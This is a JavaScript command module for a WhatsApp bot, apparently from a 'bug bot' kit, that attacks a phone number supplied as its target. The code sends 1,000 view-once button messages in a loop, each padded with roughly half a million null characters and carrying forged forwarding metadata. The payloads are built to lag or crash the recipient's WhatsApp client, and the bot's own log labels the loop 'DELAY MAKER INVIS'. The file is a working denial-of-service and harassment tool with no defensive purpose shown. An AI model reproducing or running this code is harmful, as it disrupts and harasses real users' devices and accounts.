import { isJidGroup } from "@bayumahadika/baileysx";
import utils from "@bayumahadika/utils";
import chalk from "chalk";

export default {
  description: "Delay invis 2",
  onlyOwner: false,
  onlyPremium: true,
  handle: async (sock, m) => {
    if (!m.args[0]) return;
    if (isJidGroup(m.args[0]))
      return m.replyError("Hanya support untuk private chat");
    const number = m.args[0]?.replace(/\D/g, "");
    if (!number) return m.replyError("Target dibutuhkan");
    const jid = (await sock.onWhatsApp(`${number}@s.whatsapp.net`))[0]?.jid;
    if (!jid) return m.replyError(`${m.args[0]} tidak terdaftar diwhatsapp`);
    await m.reply(global.mess.spam);
    for (let i = 0; i < 1000; i++) {
      try {
        await utils.sleep(500);
        await sock.relay(
          jid,
          {
            viewOnceMessage: {
              message: {
                buttonsMessage: {
                  contextInfo: {
                    isForwarded: true,
                    forwardingScore: 1,
                    forwardedNewsletterMessageInfo: {
                      newsletterJid: global.bot.newsletterJid,
                      newsletterName: global.bot.name,
                      serverMessageId: 1,
                    },
                    remoteJid: jid,
                    participant: jid,
                    quotedMessage: {
                      viewOnceMessage: {
                        message: {
                          buttonsMessage: {
                            buttons: [
                              {
                                buttonId: `${global.bot.prefix}${"\u0000".repeat(
                                  510000,
                                )}`,
                                buttonText: {
                                  displayText: `${global.bot.name}${"\u0000".repeat(
                                    510000,
                                  )}`,
                                },
                                type: 1,
                              },
                            ],
                            contentText:
                              "Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmodtempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet.",
                            headerType: 2,
                            text: global.bot.name,
                            footerText: global.owner.name,
                          },
                        },
                      },
                    },
                  },
                  buttons: [
                    {
                      buttonId: "p",
                      buttonText: {
                        displayText: global.bot.name,
                      },
                      type: 1,
                    },
                    {
                      buttonId: "action",
                      buttonText: {
                        displayText: "p",
                      },
                      type: 2,
                      nativeFlowInfo: {
                        name: "galaxy_message",
                        paramsJson: "",
                      },
                    },
                    {
                      buttonId: "action",
                      buttonText: {
                        displaText: "p",
                      },
                      type: 2,
                      nativeFlowInfo: {
                        name: "call_permission_request",
                        paramsJson: "",
                      },
                    },
                  ],
                  contentText:
                    "Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmodtempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet.",
                  headerType: 2,
                  text: global.bot.name,
                  footerText: global.owner.name,
                },
              },
            },
          },
          { participant: { jid } },
        );
        console.log(
          `${chalk.bgBlueBright.bold.white(
            `[${i + 1}]. DELAY MAKER INVIS`,
          )}: ${chalk.bold(m.args[0])}`,
        );
      } catch (err) {
        console.log(err);
      }
    }
  },
};
